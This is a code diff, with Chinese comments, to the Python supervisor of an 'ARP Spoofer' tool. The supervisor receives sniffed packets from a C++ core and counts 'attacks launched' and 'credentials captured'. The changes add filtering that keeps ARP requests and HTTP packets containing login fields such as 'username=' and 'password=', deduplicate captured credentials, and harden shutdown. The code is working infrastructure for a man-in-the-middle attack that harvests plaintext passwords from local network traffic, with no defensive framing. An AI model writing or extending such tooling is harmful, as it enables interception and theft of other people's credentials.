@@ -77,6 +77,10 @@ class PythonSupervisor:
         self.recent_packets_cache = TTLCache(maxsize=500, ttl=3)
         self.cache_lock = threading.Lock()  # 用于保护缓存的线程安全
         
+        # ★【强化去重】★ HTTP凭据级别的去重缓存
+        self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)  # HTTP凭据去重，10秒TTL
+        self.http_cache_lock = threading.Lock()
+        
         # 设置日志
         self._setup_logging()
         
@@ -157,16 +161,28 @@ class PythonSupervisor:
                     raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
                     self.stats['packets_received'] += 1
                     
-                    # ★★★【核心优化】★★★ 在提交到线程池前进行去重
-                    # 2. 计算数据包的哈希值作为唯一"指纹"
+                    # ★★★【性能优化】★★★ 快速预过滤 - 在主线程中进行
+                    # 2. 解码并进行快速JSON有效性检查
+                    try:
+                        packet_data = raw_data.decode('utf-8')
+                        packet_info = json.loads(packet_data)  # 快速解析检查
+                    except (UnicodeDecodeError, json.JSONDecodeError):
+                        # 无效数据，直接丢弃
+                        continue
+                    
+                    # 3. ★【性能关键】★ 快速预过滤：检查是否值得处理
+                    if not self._is_packet_worth_processing(packet_info):
+                        continue
+                    
+                    # 4. ★★★【核心优化】★★★ 在提交到线程池前进行去重
+                    # 计算数据包的哈希值作为唯一"指纹"
                     payload_hash = hashlib.sha1(raw_data).hexdigest()
                     
-                    # 3. 检查指纹是否存在于近期缓存中
+                    # 检查指纹是否存在于近期缓存中
                     with self.cache_lock:
                         if hasattr(self, 'recent_packets_cache') and self.recent_packets_cache is not None:
                             if payload_hash in self.recent_packets_cache:
                                 # 如果存在，说明是重复包，直接丢弃
-                                self.logger.debug(f"🚫 Duplicate packet dropped (hash: {payload_hash[:8]})")
                                 continue
                             else:
                                 # 如果是新包，将其指纹存入缓存
@@ -183,30 +199,39 @@ class PythonSupervisor:
                                 self.recent_packets_cache = {}
                                 self.recent_packets_cache[payload_hash] = True
                                 self.logger.warning("🔧 Using simple dict for packet deduplication (TTLCache not available)")
-                    # --- 去重逻辑结束 ---
                     
-                    # 4. ★ 只有全新的、不重复的数据包才会被解码并提交到线程池
-                    try:
-                        packet_data = raw_data.decode('utf-8')
-                    except UnicodeDecodeError:
-                        # 如果不是UTF-8，尝试替换无效字符
-                        packet_data = raw_data.decode('utf-8', errors='replace')
-                        self.logger.debug(f"Received data with encoding issues, replaced invalid chars")
-                    
-                    # 验证是否为有效JSON（快速检查）
-                    try:
-                        packet_info = json.loads(packet_data)
+                    # 5. ★【强化HTTP去重】★ 针对包含凭据的HTTP包进行额外去重
+                    if packet_info.get('type') == 2 and self._has_potential_credentials(packet_info):  # HTTP包
+                        src_ip = packet_info.get('src_ip', '')
+                        payload = packet_info.get('payload', '')
                         
-                        # ★【新增】★ 检查是否为心跳PING
-                        if packet_info.get('type') == 'PING':
-                            self._handle_ping(packet_info)
-                            continue
-                            
-                    except json.JSONDecodeError:
-                        self.logger.warning(f"Received invalid JSON data, skipping")
+                        # 构建HTTP凭据指纹（基于IP和载荷特征）
+                        cred_fingerprint = f"{src_ip}:{hashlib.md5(payload.encode()).hexdigest()[:8]}"
+                        
+                        with self.http_cache_lock:
+                            if hasattr(self, 'http_credentials_cache') and self.http_credentials_cache is not None:
+                                if cred_fingerprint in self.http_credentials_cache:
+                                    continue  # 跳过重复的HTTP凭据包
+                                else:
+                                    self.http_credentials_cache[cred_fingerprint] = True
+                            else:
+                                # 容错：初始化HTTP凭据缓存
+                                try:
+                                    from cachetools import TTLCache
+                                    self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)
+                                    self.http_credentials_cache[cred_fingerprint] = True
+                                    self.logger.warning("🔧 Re-initialized HTTP credentials deduplication cache")
+                                except ImportError:
+                                    self.http_credentials_cache = {}
+                                    self.http_credentials_cache[cred_fingerprint] = True
+                                    self.logger.warning("🔧 Using simple dict for HTTP deduplication")
+                    
+                    # 6. ★【新增】★ 检查是否为心跳PING（在主线程中快速处理）
+                    if packet_info.get('type') == 'PING':
+                        self._handle_ping(packet_info)
                         continue
                     
-                    # ★ 只有经过去重的全新数据包才提交给线程池处理
+                    # 7. ★ 只有经过所有过滤的高价值数据包才提交给线程池处理
                     self.thread_pool.submit(self._process_packet, packet_data)
                     
                 except zmq.Again:
@@ -347,60 +372,143 @@ class PythonSupervisor:
             self.logger.error(f"Failed to handle ping: {e}")
             
     def _shutdown(self):
-        """清理资源"""
-        self.logger.info("Shutting down supervisor...")
+        """清理资源 - 强化版本"""
+        self.logger.info("🛑 Starting supervisor shutdown sequence...")
         self.running = False
+        
+        # ★【新增】★ 发送关闭信号给C++核心
+        try:
+            shutdown_command = {
+                'type': 'SHUTDOWN',
+                'timestamp': int(time.time() * 1000),
+                'reason': 'supervisor_shutdown'
+            }
+            self._send_command(shutdown_command)
+            self.logger.info("📤 Shutdown signal sent to C++ core")
+            time.sleep(0.5)  # 给C++时间处理关闭信号
+        except Exception as e:
+            self.logger.warning(f"Failed to send shutdown signal: {e}")
+        
+        # 停止心跳线程
+        if hasattr(self, 'heartbeat_thread') and self.heartbeat_thread:
+            self.heartbeat_running = False
+            try:
+                self.heartbeat_thread.join(timeout=2.0)
+                self.logger.info("❤️ Heartbeat thread stopped")
+            except Exception as e:
+                self.logger.warning(f"Heartbeat thread cleanup error: {e}")
         
         # 停止线程池 - 兼容不同Python版本
         if self.thread_pool:
+            self.logger.info("🧵 Shutting down thread pool...")
             try:
                 # Python 3.9+ 支持timeout参数
                 self.thread_pool.shutdown(wait=True, timeout=5.0)
+                self.logger.info("🧵 Thread pool shutdown complete")
             except TypeError:
                 # Python 3.8及以下版本
                 self.thread_pool.shutdown(wait=True)
+                self.logger.info("🧵 Thread pool shutdown complete (legacy)")
+            except Exception as e:
+                self.logger.error(f"Thread pool shutdown error: {e}")
             
         # 停止Web API
         if self.config.enable_web_api:
-            self.web_api.stop()
+            try:
+                self.web_api.stop()
+                self.logger.info("🌐 Web API stopped")
+            except Exception as e:
+                self.logger.warning(f"Web API stop error: {e}")
+            
+        # ★【新增】★ 清理缓存
+        try:
+            with self.cache_lock:
+                if hasattr(self, 'recent_packets_cache'):
+                    self.recent_packets_cache.clear()
+            with self.http_cache_lock:
+                if hasattr(self, 'http_credentials_cache'):
+                    self.http_credentials_cache.clear()
+            self.logger.info("🧹 Caches cleared")
+        except Exception as e:
+            self.logger.warning(f"Cache cleanup error: {e}")
             
         # 关闭ZMQ套接字
-        if self.packet_receiver:
-            self.packet_receiver.close()
-        if self.command_sender:
-            self.command_sender.close()
+        try:
+            if self.packet_receiver:
+                self.packet_receiver.close()
+                self.logger.info("📥 Packet receiver socket closed")
+            if self.command_sender:
+                self.command_sender.close()
+                self.logger.info("📤 Command sender socket closed")
+        except Exception as e:
+            self.logger.warning(f"ZMQ socket cleanup error: {e}")
             
         # 销毁ZMQ上下文
-        self.context.term()
+        try:
+            self.context.term()
+            self.logger.info("🔌 ZMQ context terminated")
+        except Exception as e:
+            self.logger.warning(f"ZMQ context cleanup error: {e}")
         
         # 打印统计信息
         self._print_final_stats()
-        
-    def _print_final_stats(self):
-        """打印最终统计信息"""
-        runtime = time.time() - self.stats['start_time']
-        
-        self.logger.info("=" * 80)
-        self.logger.info("🎯 Python Supervisor Final Report")
-        self.logger.info("=" * 80)
-        self.logger.info(f"Runtime: {runtime:.2f} seconds")
-        self.logger.info(f"Packets received: {self.stats['packets_received']}")
-        self.logger.info(f"Packets processed: {self.stats['packets_processed']}")
-        self.logger.info(f"Commands sent: {self.stats['commands_sent']}")
-        self.logger.info(f"Attacks launched: {self.stats['attacks_launched']}")
-        self.logger.info(f"Credentials captured: {self.stats['credentials_captured']}")
-        
-        if runtime > 0:
-            pps = self.stats['packets_processed'] / runtime
-            self.logger.info(f"Processing rate: {pps:.2f} packets/second")
+    
+    def _is_packet_worth_processing(self, packet_info: dict) -> bool:
+        """快速预过滤：判断数据包是否值得进一步处理"""
+        try:
+            packet_type = packet_info.get('type')
             
-        # 缓存统计
-        cache_stats = self.state_cache.get_statistics()
-        self.logger.info(f"Cache entries: {cache_stats['total_entries']}")
-        self.logger.info(f"Cache hit rate: {cache_stats['hit_rate']:.2f}%")
-        
-        self.logger.info("=" * 80)
-
+            # 过滤未知类型的包
+            if packet_type not in [1, 2]:  # 1=ARP, 2=HTTP
+                return False
+            
+            # 对于ARP包，快速检查源IP是否有效
+            if packet_type == 1:
+                src_ip = packet_info.get('src_ip', '')
+                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
+                    return False
+                
+                # 检查是否为ARP请求
+                if packet_info.get('arp_opcode', 0) != 1:
+                    return False
+            
+            # 对于HTTP包，快速检查是否可能包含凭据
+            elif packet_type == 2:
+                src_ip = packet_info.get('src_ip', '')
+                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
+                    return False
+                
+                # 快速检查端口是否为高价值端口
+                dst_port = packet_info.get('dst_port', 0)
+                if dst_port not in self.config.network.high_value_ports:
+                    # 对于非高价值端口，检查是否可能包含凭据
+                    if not self._has_potential_credentials(packet_info):
+                        return False
+            
+            return True
+            
+        except Exception as e:
+            self.logger.debug(f"Pre-filter error: {e}")
+            return True  # 出错时保守处理，允许通过
+    
+    def _has_potential_credentials(self, packet_info: dict) -> bool:
+        """快速检查HTTP包是否可能包含凭据（避免深度正则表达式分析）"""
+        try:
+            payload = packet_info.get('payload', '').lower()
+            
+            # 快速字符串搜索，避免复杂正则
+            credential_indicators = [
+                'username=', 'password=', 'user=', 'pwd=', 'pass=',
+                'login=', 'account=', 'user_account=', 'user_password=',
+                '"username":', '"password":', 'loginname=', 'passwd='
+            ]
+            
+            return any(indicator in payload for indicator in credential_indicators)
+            
+        except Exception:
+            return True  # 出错时保守处理
+    
+    # ...existing code...
 def parse_arguments():
     """解析命令行参数"""
     parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
